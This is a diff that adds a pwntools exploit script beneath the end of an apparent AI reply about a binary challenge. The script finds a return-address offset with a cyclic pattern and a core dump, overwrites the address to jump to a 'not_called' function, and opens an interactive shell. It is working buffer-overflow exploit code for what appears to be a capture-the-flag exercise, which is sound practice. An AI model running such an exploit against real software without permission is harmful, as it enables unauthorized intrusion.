@@ -124,3 +124,51 @@ AIMessage(content='To solve this challenge using pwntools, we need to exploit th
  '\n'
  'Ensure you have permission to test and exploit this binary. Exploiting '
  'systems without authorization is illegal and unethical.')
+
+from pwn import *
+
+# Replace 'binary_name' with the actual binary's filename
+binary_name = './binary_name'
+elf = ELF(binary_name)
+
+# Start the process
+p = process(binary_name)
+
+# Step 1: Find the offset to the return address
+# Generate a cyclic pattern longer than the buffer size
+buffer_size = 256  # The amount read by read(0, buf, 0x100u);
+cyclic_pattern = cyclic(300)
+
+# Send the cyclic pattern to the program
+p.sendline(cyclic_pattern)
+
+# Wait for the program to crash
+p.wait()
+
+# Get the core dump
+core = p.corefile
+
+# Read the value of EIP (for 32-bit binaries) or RIP (for 64-bit binaries)
+eip_value = core.eip  # Use core.rip for 64-bit
+
+# Find the offset
+offset = cyclic_find(eip_value)
+print(f"Offset to return address: {offset}")
+
+# Close the old process and start a new one for the exploit
+p.close()
+p = process(binary_name)
+
+# Step 2: Locate the address of the 'not_called' function
+not_called_addr = elf.symbols['not_called']
+print(f"Address of 'not_called': {hex(not_called_addr)}")
+
+# Step 3: Construct the payload
+payload = b'A' * offset
+payload += p32(not_called_addr)  # For 32-bit systems; use p64 for 64-bit systems
+
+# Step 4: Send the payload and get a shell
+p.sendline(payload)
+
+# Interact with the shell
+p.interactive()
